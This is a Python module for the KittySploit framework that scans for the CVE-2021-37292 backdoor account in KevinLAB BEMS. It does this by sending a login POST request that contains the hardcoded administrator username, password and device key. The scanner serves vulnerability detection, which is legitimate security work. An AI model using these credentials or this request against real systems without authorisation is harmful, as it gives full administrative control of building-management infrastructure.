#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""KevinLAB BEMS has an undocumented backdoor account, and these sets of credentials are never exposed to the end."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'KevinLAB BEMS (Building Energy Management System) - Backdoor Account Detection',
        'description': 'KevinLAB BEMS has an undocumented backdoor account, and these sets of credentials are never exposed to the end-user and cannot be changed through any normal operation of the solution through the RMI. An attacker could exploit this vulnerability by logging in using the backdoor account with highest privileges for administration and gain full system control. The backdoor user cannot be seen in the users settings in the admin panel, and it also uses an undocumented privilege level (admin_pk=1) which allows full availability of the features that the BEMS is offering remotely.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'kevinlab', 'bems', 'backdoor', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5654.php',
            'https://nvd.nist.gov/vuln/detail/cve-2021-37292',
        ],
        'cve': 'CVE-2021-37292',
    }

    def run(self):
        path = '/http/index.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept': 'application/json, text/javascript, */*; q=0.01', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}, data='requester=login&request=login&params=%5B%7B%22name%22%3A%22input_id%22%2C%22value%22%3A%22kevinlab%22%7D%2C%7B%22name%22%3A%22input_passwd%22%2C%22value%22%3A%22kevin003%22%7D%2C%7B%22name%22%3A%22device_key%22%2C%22value%22%3A%22a2fe6b53-e09d-46df-8c9a-e666430e163e%22%7D%2C%7B%22name%22%3A%22auto_login%22%2C%22value%22%3Afalse%7D%2C%7B%22name%22%3A%22login_key%22%2C%22value%22%3A%22%22%7D%5D\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('"result":true',)
        body_regexes = ('data":"[A-Za-z0-9-]+', 'login_key":"[A-Za-z0-9-]+',)
        if (any(m in body for m in body_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='high', reason='KevinLAB BEMS (Building Energy Management System) - Backdoor Account detected', path=path)
            return True
        return False

